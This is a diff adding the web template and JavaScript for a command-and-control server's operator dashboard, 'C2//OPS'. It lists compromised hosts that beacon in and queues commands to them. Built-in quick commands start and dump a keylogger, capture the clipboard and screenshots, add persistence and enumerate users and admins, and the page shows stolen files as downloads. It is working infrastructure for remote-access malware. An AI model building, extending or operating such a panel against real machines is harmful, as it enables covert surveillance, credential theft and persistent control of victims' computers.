@@ -1,0 +1,433 @@
+{% extends 'base.html' %}
+{% set active_page = 'dashboard' %}
+
+{% block title %}Sessions — C2//OPS{% endblock %}
+
+{% block extra_style %}
+  .layout { display: grid; grid-template-columns: 290px 1fr; height: calc(100vh - 54px); overflow: hidden; }
+
+  /* ── SIDEBAR ── */
+  .sidebar { background: var(--surface); border-right: 1px solid var(--border); display: flex; flex-direction: column; overflow: hidden; }
+  .sidebar-hdr { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .sidebar-title { font-family: var(--font-mono); font-size: 0.72rem; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
+  .agent-list { flex: 1; overflow-y: auto; }
+  .agent-list::-webkit-scrollbar { width: 3px; }
+  .agent-list::-webkit-scrollbar-thumb { background: var(--border); }
+
+  .agent-item { padding: 11px 14px; border-bottom: 1px solid var(--border); cursor: pointer; transition: background .15s; display: flex; align-items: flex-start; gap: 9px; }
+  .agent-item:hover { background: rgba(0,255,65,.04); }
+  .agent-item.selected { background: rgba(0,255,65,.08); border-left: 2px solid var(--green); padding-left: 12px; }
+  .sdot { width: 7px; height: 7px; border-radius: 50%; margin-top: 5px; flex-shrink: 0; }
+  .sdot.active   { background: var(--green); animation: pulse-dot 2s infinite; }
+  .sdot.inactive { background: var(--red); }
+  .a-info { flex: 1; min-width: 0; }
+  .a-host { font-family: var(--font-mono); font-size: 0.82rem; font-weight: 600; color: var(--text); white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .a-meta { font-size: 0.7rem; color: var(--muted); margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .a-right { display: flex; flex-direction: column; align-items: flex-end; gap: 3px; flex-shrink: 0; }
+  .a-time { font-family: var(--font-mono); font-size: 0.65rem; color: var(--muted); }
+  .badge { background: var(--yellow); color: #000; font-family: var(--font-mono); font-size: 0.62rem; font-weight: 700; padding: 1px 5px; border-radius: 8px; }
+
+  /* ── MAIN PANEL ── */
+  .panel { display: flex; flex-direction: column; overflow: hidden; }
+  .empty-state { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 10px; color: var(--muted); }
+  .empty-icon { font-size: 2.5rem; opacity: .25; }
+  .empty-txt { font-family: var(--font-mono); font-size: .82rem; }
+
+  /* panel header */
+  .panel-hdr { padding: 12px 20px; border-bottom: 1px solid var(--border); background: var(--surface); display: flex; align-items: center; justify-content: space-between; flex-shrink: 0; }
+  .agent-name { font-family: var(--font-mono); font-size: .9rem; font-weight: 700; color: var(--green); }
+  .agent-detail { font-size: .72rem; color: var(--muted); display: flex; gap: 14px; flex-wrap: wrap; margin-top: 3px; }
+  .agent-detail span { display: flex; gap: 4px; }
+  .dl { color: var(--muted); }
+  .dv { font-family: var(--font-mono); color: var(--text); }
+  .panel-actions { display: flex; gap: 6px; }
+  .act-btn { font-family: var(--font-mono); font-size: .7rem; padding: 4px 10px; border-radius: 4px; cursor: pointer; border: 1px solid var(--border); background: none; color: var(--muted); transition: all .15s; }
+  .act-btn:hover { color: var(--text); border-color: var(--muted); }
+  .act-btn.danger:hover { color: var(--red); border-color: var(--red); }
+
+  /* tabs */
+  .panel-tabs { display: flex; border-bottom: 1px solid var(--border); background: var(--surface); flex-shrink: 0; }
+  .ptab { font-family: var(--font-mono); font-size: .72rem; padding: 8px 16px; cursor: pointer; color: var(--muted); border-bottom: 2px solid transparent; transition: color .15s; }
+  .ptab:hover { color: var(--text); }
+  .ptab.active { color: var(--green); border-bottom-color: var(--green); }
+
+  /* pending queue */
+  .pending-panel { border-bottom: 1px solid var(--border); background: rgba(255,215,0,.04); max-height: 130px; overflow-y: auto; display: none; flex-shrink: 0; }
+  .pending-panel.open { display: block; }
+  .pi { display: flex; align-items: center; gap: 10px; padding: 6px 20px; border-bottom: 1px solid var(--border); }
+  .pi:last-child { border-bottom: none; }
+  .pi-cmd { font-family: var(--font-mono); font-size: .78rem; flex: 1; }
+  .pi-status { font-family: var(--font-mono); font-size: .65rem; padding: 2px 7px; border-radius: 3px; }
+  .pi-status.pending   { background: rgba(255,215,0,.15); color: var(--yellow); }
+  .pi-status.delivered { background: rgba(0,212,255,.15); color: var(--cyan); }
+  .mitre-badge { font-family: var(--font-mono); font-size: .62rem; padding: 1px 6px; border-radius: 3px; white-space: nowrap; }
+  .cancel-btn { font-family: var(--font-mono); font-size: .65rem; color: var(--red); background: none; border: 1px solid rgba(255,68,68,.3); border-radius: 3px; padding: 2px 6px; cursor: pointer; }
+  .cancel-btn:hover { background: rgba(255,68,68,.1); }
+
+  /* terminal */
+  .terminal-wrap { flex: 1; overflow: hidden; display: none; flex-direction: column; }
+  .terminal-wrap.active { display: flex; }
+  .terminal { flex: 1; overflow-y: auto; padding: 18px 20px; font-family: var(--font-mono); font-size: .8rem; line-height: 1.75; }
+  .terminal::-webkit-scrollbar { width: 3px; }
+  .terminal::-webkit-scrollbar-thumb { background: var(--border); }
+  .t-welcome { color: var(--green); opacity: .6; margin-bottom: 16px; }
+  .t-entry { margin-bottom: 16px; position: relative; }
+  .t-entry:hover .copy-btn { opacity: 1; }
+  .t-cmd { color: var(--cyan); display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+  .t-cmd::before { content: '$ '; color: var(--green); flex-shrink: 0; }
+  .t-out { color: var(--text); white-space: pre-wrap; word-break: break-all; margin-top: 4px; padding-left: 12px; border-left: 2px solid var(--border); }
+  .t-ts  { font-size: .65rem; color: var(--muted); margin-top: 3px; }
+  .t-pending { color: var(--yellow); opacity: .6; font-style: italic; }
+  .copy-btn { position: absolute; top: 0; right: 0; opacity: 0; font-family: var(--font-mono); font-size: .62rem; color: var(--muted); background: var(--surface); border: 1px solid var(--border); border-radius: 3px; padding: 1px 6px; cursor: pointer; transition: opacity .15s, color .15s; }
+  .copy-btn:hover { color: var(--green); }
+  .t-screenshot img { max-width: 100%; border: 1px solid var(--border); border-radius: 4px; margin-top: 6px; display: block; }
+  .t-file a { color: var(--cyan); text-decoration: none; }
+  .t-file a:hover { text-decoration: underline; }
+
+  /* notes tab */
+  .notes-wrap { flex: 1; overflow: hidden; display: none; flex-direction: column; }
+  .notes-wrap.active { display: flex; }
+  .notes-list { flex: 1; overflow-y: auto; padding: 14px 20px; display: flex; flex-direction: column; gap: 10px; }
+  .note-item { background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 10px 14px; position: relative; }
+  .note-content { font-size: .85rem; line-height: 1.6; white-space: pre-wrap; }
+  .note-ts { font-family: var(--font-mono); font-size: .65rem; color: var(--muted); margin-top: 6px; }
+  .note-del { position: absolute; top: 8px; right: 10px; background: none; border: none; color: var(--muted); cursor: pointer; font-size: .85rem; }
+  .note-del:hover { color: var(--red); }
+  .note-input-bar { padding: 12px 20px; border-top: 1px solid var(--border); background: var(--surface); display: flex; gap: 8px; flex-shrink: 0; }
+  .note-input { flex: 1; background: var(--bg); border: 1px solid var(--border); border-radius: 4px; padding: 8px 12px; font-size: .85rem; color: var(--text); outline: none; resize: none; font-family: var(--font-ui); }
+  .note-input:focus { border-color: var(--cyan); }
+  .note-save { background: var(--cyan); color: #000; border: none; border-radius: 4px; padding: 8px 16px; font-family: var(--font-mono); font-size: .72rem; font-weight: 700; cursor: pointer; }
+  .note-save:hover { opacity: .85; }
+
+  /* cmd bar */
+  .cmd-bar { padding: 12px 20px; background: var(--surface); border-top: 1px solid var(--border); display: flex; gap: 8px; align-items: center; flex-shrink: 0; }
+  .cmd-prompt { font-family: var(--font-mono); color: var(--green); font-size: .95rem; }
+  .cmd-input { flex: 1; background: transparent; border: none; outline: none; font-family: var(--font-mono); font-size: .85rem; color: var(--text); caret-color: var(--green); }
+  .cmd-input::placeholder { color: var(--muted); }
+  .cmd-send { background: var(--green); color: #000; border: none; padding: 6px 16px; border-radius: 4px; font-family: var(--font-mono); font-size: .75rem; font-weight: 700; cursor: pointer; }
+  .cmd-send:hover { background: var(--green-dim); }
+  .cmd-send:disabled { background: var(--muted); cursor: not-allowed; }
+  .cmd-hints { padding: 6px 20px; background: var(--surface); display: flex; gap: 5px; flex-wrap: wrap; border-top: 1px solid var(--border); flex-shrink: 0; }
+  .hint { font-family: var(--font-mono); font-size: .65rem; background: var(--border); color: var(--muted); padding: 2px 7px; border-radius: 3px; cursor: pointer; }
+  .hint:hover { color: var(--cyan); }
+{% endblock %}
+
+{% block content %}
+<div class="layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-hdr"><div class="sidebar-title">// Active Sessions</div></div>
+    <div class="agent-list" id="agent-list">
+      <div style="padding:18px 14px;color:var(--muted);font-family:var(--font-mono);font-size:.75rem;">Waiting for agents...</div>
+    </div>
+  </aside>
+
+  <!-- MAIN PANEL -->
+  <main class="panel">
+
+    <div class="empty-state" id="empty-state">
+      <div class="empty-icon">⬛</div>
+      <div class="empty-txt">// Select an agent to open a session</div>
+    </div>
+
+    <div id="agent-panel" style="display:none;flex-direction:column;flex:1;overflow:hidden;">
+
+      <!-- Header -->
+      <div class="panel-hdr">
+        <div>
+          <div class="agent-name" id="p-hostname">—</div>
+          <div class="agent-detail">
+            <span><span class="dl">IP</span>&nbsp;<span class="dv" id="p-ip">—</span></span>
+            <span><span class="dl">OS</span>&nbsp;<span class="dv" id="p-os">—</span></span>
+            <span><span class="dl">USER</span>&nbsp;<span class="dv" id="p-user">—</span></span>
+            <span><span class="dl">FIRST SEEN</span>&nbsp;<span class="dv" id="p-first">—</span></span>
+            <span><span class="dl" style="font-size:.62rem">ID</span>&nbsp;<span class="dv" id="p-id" style="font-size:.62rem;color:var(--muted)">—</span></span>
+          </div>
+        </div>
+        <div class="panel-actions">
+          <button class="act-btn" onclick="toggleQueue()">[ queue ]</button>
+          <button class="act-btn" onclick="clearTerminal()">[ clear ]</button>
+          <button class="act-btn danger" onclick="confirmKill()">[ kill ]</button>
+        </div>
+      </div>
+
+      <!-- Tabs -->
+      <div class="panel-tabs">
+        <div class="ptab active" id="tab-terminal" onclick="switchTab('terminal')">Terminal</div>
+        <div class="ptab" id="tab-notes" onclick="switchTab('notes')">Notes</div>
+      </div>
+
+      <!-- Pending queue (collapsible) -->
+      <div class="pending-panel" id="pending-panel">
+        <div id="pending-list"></div>
+      </div>
+
+      <!-- Terminal -->
+      <div class="terminal-wrap active" id="view-terminal">
+        <div class="terminal" id="terminal">
+          <div class="t-welcome">// Session active — commands execute on next beacon</div>
+        </div>
+        <div class="cmd-hints">
+          <span class="hint" onclick="fillCmd('shell whoami')">whoami</span>
+          <span class="hint" onclick="fillCmd('shell ipconfig /all')">ipconfig</span>
+          <span class="hint" onclick="fillCmd('shell net user')">net user</span>
+          <span class="hint" onclick="fillCmd('shell net localgroup administrators')">local admins</span>
+          <span class="hint" onclick="fillCmd('shell tasklist')">tasklist</span>
+          <span class="hint" onclick="fillCmd('netstat')">netstat</span>
+          <span class="hint" onclick="fillCmd('arp')">arp</span>
+          <span class="hint" onclick="fillCmd('privs')">privs</span>
+          <span class="hint" onclick="fillCmd('shell systeminfo')">systeminfo</span>
+          <span class="hint" onclick="fillCmd('sysinfo')">sysinfo</span>
+          <span class="hint" onclick="fillCmd('screenshot')">screenshot</span>
+          <span class="hint" onclick="fillCmd('clipboard')">clipboard</span>
+          <span class="hint" onclick="fillCmd('keylogger start')">klog start</span>
+          <span class="hint" onclick="fillCmd('keylogger dump')">klog dump</span>
+          <span class="hint" onclick="fillCmd('persist add')">persist</span>
+          <span class="hint" onclick="fillCmd('sleep 60')">sleep 60s</span>
+        </div>
+        <div class="cmd-bar">
+          <div class="cmd-prompt">&gt;</div>
+          <input class="cmd-input" id="cmd-input" type="text" placeholder="Enter command (↑↓ history)..." autocomplete="off" spellcheck="false"/>
+          <button class="cmd-send" id="cmd-send" onclick="sendCommand()">SEND</button>
+        </div>
+      </div>
+
+      <!-- Notes -->
+      <div class="notes-wrap" id="view-notes">
+        <div class="notes-list" id="notes-list">
+          <div style="color:var(--muted);font-size:.8rem;text-align:center;padding:20px;">No notes yet.</div>
+        </div>
+        <div class="note-input-bar">
+          <textarea class="note-input" id="note-input" rows="2" placeholder="Add a note about this agent..."></textarea>
+          <button class="note-save" onclick="saveNote()">SAVE</button>
+        </div>
+      </div>
+
+    </div>
+  </main>
+</div>
+{% endblock %}
+
+{% block extra_script %}
+  let selectedId   = null;
+  let agentCache   = {};
+  let resultsSeen  = new Set();
+  let cmdHistory   = [];
+  let historyIdx   = -1;
+  let queueOpen    = false;
+  let currentTab   = 'terminal';
+
+  // ── Agent list ──────────────────────────────────────────────────────────────
+  async function refreshAgents() {
+    try {
+      const agents = await (await fetch('/api/agents')).json();
+      const list   = document.getElementById('agent-list');
+      if (!agents.length) {
+        list.innerHTML = '<div style="padding:18px 14px;color:var(--muted);font-family:var(--font-mono);font-size:.75rem;">Waiting for agents...</div>';
+        return;
+      }
+      agents.forEach(a => agentCache[a.id] = a);
+      list.innerHTML = agents.map(a => `
+        <div class="agent-item ${a.id===selectedId?'selected':''}" onclick="selectById('${esc(a.id)}')">
+          <div class="sdot ${a.status}"></div>
+          <div class="a-info">
+            <div class="a-host">${esc(a.hostname||'unknown')}</div>
+            <div class="a-meta">${esc(a.ip||'?')} · ${esc(a.os||'?')} · ${esc(a.username||'?')}</div>
+          </div>
+          <div class="a-right">
+            <div class="a-time">${timeSince(a.last_seen)}</div>
+            ${a.pending_tasks>0?`<div class="badge">${a.pending_tasks}</div>`:''}
+          </div>
+        </div>`).join('');
+    } catch {}
+  }
+
+  function selectById(id) { if (agentCache[id]) selectAgent(agentCache[id]); }
+
+  function selectAgent(a) {
+    selectedId = a.id;
+    resultsSeen.clear(); cmdHistory = []; historyIdx = -1;
+    document.getElementById('empty-state').style.display = 'none';
+    const p = document.getElementById('agent-panel'); p.style.display = 'flex';
+    document.getElementById('p-hostname').textContent = a.hostname||'unknown';
+    document.getElementById('p-ip').textContent       = a.ip||'?';
+    document.getElementById('p-os').textContent       = a.os||'?';
+    document.getElementById('p-user').textContent     = a.username||'?';
+    document.getElementById('p-first').textContent    = a.first_seen ? new Date(a.first_seen+'Z').toLocaleString() : '?';
+    document.getElementById('p-id').textContent       = a.id;
+    document.getElementById('terminal').innerHTML     = '<div class="t-welcome">// Session active — commands execute on next beacon</div>';
+    queueOpen = false; document.getElementById('pending-panel').classList.remove('open');
+    switchTab('terminal');
+    refreshAgents(); refreshResults(); refreshNotes();
+  }
+
+  // ── Results ─────────────────────────────────────────────────────────────────
+  async function refreshResults() {
+    if (!selectedId) return;
+    try {
+      const results = await (await fetch(`/api/results/${selectedId}`)).json();
+      const term    = document.getElementById('terminal');
+      const toAdd   = results.filter(r => !resultsSeen.has(r.id)).reverse();
+      toAdd.forEach(r => {
+        resultsSeen.add(r.id);
+        const div = document.createElement('div'); div.className = 't-entry';
+        div.innerHTML = `
+          <button class="copy-btn" onclick="copyText(this,'${esc(r.output||'')}')"  >copy</button>
+          <div class="t-cmd">
+            ${esc(r.command)}
+            ${r.mitre_id ? `<a class="mitre-badge" style="background:${r.mitre_color}22;color:${r.mitre_color};border:1px solid ${r.mitre_color}44;text-decoration:none" href="https://attack.mitre.org/techniques/${r.mitre_id.replace('.','/') }" target="_blank">${r.mitre_id} · ${esc(r.mitre_name)}</a>` : ''}
+          </div>
+          ${renderOutput(r.output)}
+          <div class="t-ts">${new Date(r.received_at+'Z').toLocaleString()}</div>`;
+        term.appendChild(div);
+      });
+      if (toAdd.length) term.scrollTop = term.scrollHeight;
+    } catch {}
+  }
+
+  function renderOutput(out) {
+    if (!out) return '<div class="t-out">(no output)</div>';
+    if (out.startsWith('[SCREENSHOT_B64]'))
+      return `<div class="t-screenshot"><img src="data:image/png;base64,${out.slice(16)}" alt="screenshot"/></div>`;
+    const fm = out.match(/^\[FILE_B64 path=(.+?)\](.+)$/s);
+    if (fm) {
+      const fn = fm[1].split(/[/\\]/).pop();
+      return `<div class="t-out t-file">⬇ <a href="data:application/octet-stream;base64,${fm[2]}" download="${esc(fn)}">Download ${esc(fm[1])}</a></div>`;
+    }
+    return `<div class="t-out">${esc(out)}</div>`;
+  }
+
+  // ── Send command ─────────────────────────────────────────────────────────────
+  async function sendCommand() {
+    if (!selectedId) return;
+    const inp = document.getElementById('cmd-input');
+    const cmd = inp.value.trim(); if (!cmd) return;
+    cmdHistory.unshift(cmd); historyIdx = -1; inp.value = '';
+    document.getElementById('cmd-send').disabled = true;
+
+    const term = document.getElementById('terminal');
+    const el   = document.createElement('div'); el.className = 't-entry';
+    el.innerHTML = `<div class="t-cmd">${esc(cmd)}</div><div class="t-out t-pending">[ queued — waiting for beacon... ]</div>`;
+    term.appendChild(el); term.scrollTop = term.scrollHeight;
+
+    try {
+      await fetch('/api/task', { method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({agent_id: selectedId, command: cmd}) });
+    } catch {}
+    document.getElementById('cmd-send').disabled = false;
+    inp.focus();
+  }
+
+  // ── Queue ───────────────────────────────────────────────────────────────────
+  async function toggleQueue() {
+    queueOpen = !queueOpen;
+    document.getElementById('pending-panel').classList.toggle('open', queueOpen);
+    if (queueOpen) await refreshQueue();
+  }
+
+  async function refreshQueue() {
+    if (!selectedId) return;
+    try {
+      const tasks = await (await fetch(`/api/pending/${selectedId}`)).json();
+      const el    = document.getElementById('pending-list');
+      if (!tasks.length) { el.innerHTML = '<div style="padding:8px 20px;font-family:var(--font-mono);font-size:.72rem;color:var(--muted);">No pending tasks.</div>'; return; }
+      el.innerHTML = tasks.map(t => `
+        <div class="pi">
+          <div class="pi-cmd">${esc(t.command)}</div>
+          ${t.mitre_id ? `<span class="mitre-badge" style="background:${t.mitre_color}22;color:${t.mitre_color};border:1px solid ${t.mitre_color}44">${t.mitre_id}</span>` : ''}
+          <div class="pi-status ${t.status}">${t.status.toUpperCase()}</div>
+          ${t.status==='pending'?`<button class="cancel-btn" onclick="cancelTask('${t.id}')">cancel</button>`:''}
+        </div>`).join('');
+    } catch {}
+  }
+
+  async function cancelTask(id) {
+    await fetch(`/api/task/${id}/cancel`, {method:'POST'});
+    await refreshQueue(); await refreshAgents();
+  }
+
+  // ── Notes ───────────────────────────────────────────────────────────────────
+  async function refreshNotes() {
+    if (!selectedId) return;
+    try {
+      const notes = await (await fetch(`/api/notes/${selectedId}`)).json();
+      const el    = document.getElementById('notes-list');
+      if (!notes.length) { el.innerHTML = '<div style="color:var(--muted);font-size:.8rem;text-align:center;padding:20px;">No notes yet.</div>'; return; }
+      el.innerHTML = notes.map(n => `
+        <div class="note-item">
+          <button class="note-del" onclick="deleteNote('${n.id}')">✕</button>
+          <div class="note-content">${esc(n.content)}</div>
+          <div class="note-ts">${new Date(n.created_at+'Z').toLocaleString()}</div>
+        </div>`).join('');
+    } catch {}
+  }
+
+  async function saveNote() {
+    const inp  = document.getElementById('note-input');
+    const text = inp.value.trim(); if (!text || !selectedId) return;
+    await fetch(`/api/notes/${selectedId}`, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({content:text}) });
+    inp.value = '';
+    await refreshNotes();
+  }
+
+  async function deleteNote(id) {
+    await fetch(`/api/notes/delete/${id}`, {method:'POST'});
+    await refreshNotes();
+  }
+
+  // ── UI helpers ──────────────────────────────────────────────────────────────
+  function switchTab(tab) {
+    currentTab = tab;
+    document.getElementById('view-terminal').classList.toggle('active', tab==='terminal');
+    document.getElementById('view-notes').classList.toggle('active', tab==='notes');
+    document.getElementById('tab-terminal').classList.toggle('active', tab==='terminal');
+    document.getElementById('tab-notes').classList.toggle('active', tab==='notes');
+    if (tab==='notes') refreshNotes();
+  }
+
+  function clearTerminal() {
+    document.getElementById('terminal').innerHTML = '<div class="t-welcome">// Terminal cleared.</div>';
+    resultsSeen.clear();
+  }
+
+  function confirmKill() {
+    if (confirm(`Kill agent on ${agentCache[selectedId]?.hostname}?`)) {
+      document.getElementById('cmd-input').value = 'kill'; sendCommand();
+    }
+  }
+
+  function fillCmd(c) { document.getElementById('cmd-input').value = c; document.getElementById('cmd-input').focus(); }
+
+  function copyText(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const o = btn.textContent; btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = o, 1400);
+    });
+  }
+
+  // ── Keyboard history ────────────────────────────────────────────────────────
+  document.addEventListener('DOMContentLoaded', () => {
+    const inp = document.getElementById('cmd-input');
+    inp.addEventListener('keydown', e => {
+      if (e.key==='Enter') { sendCommand(); return; }
+      if (e.key==='ArrowUp')   { e.preventDefault(); historyIdx=Math.min(historyIdx+1,cmdHistory.length-1); inp.value=cmdHistory[historyIdx]||''; }
+      if (e.key==='ArrowDown') { e.preventDefault(); historyIdx=Math.max(historyIdx-1,-1); inp.value=historyIdx>=0?cmdHistory[historyIdx]:''; }
+    });
+    document.getElementById('note-input').addEventListener('keydown', e => {
+      if (e.key==='Enter' && e.ctrlKey) saveNote();
+    });
+  });
+
+  // ── Helpers ─────────────────────────────────────────────────────────────────
+  function esc(s) { return String(s??'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }
+  function timeSince(iso) {
+    if (!iso) return '?';
+    const d = Math.floor((Date.now()-new Date(iso+'Z'))/1000);
+    return d<60?d+'s':d<3600?Math.floor(d/60)+'m':Math.floor(d/3600)+'h';
+  }
+
+  // ── Poll ────────────────────────────────────────────────────────────────────
+  async function poll() { await Promise.all([refreshAgents(), refreshResults()]); if (queueOpen) refreshQueue(); }
+  poll(); setInterval(poll, 5000);
+{% endblock %}
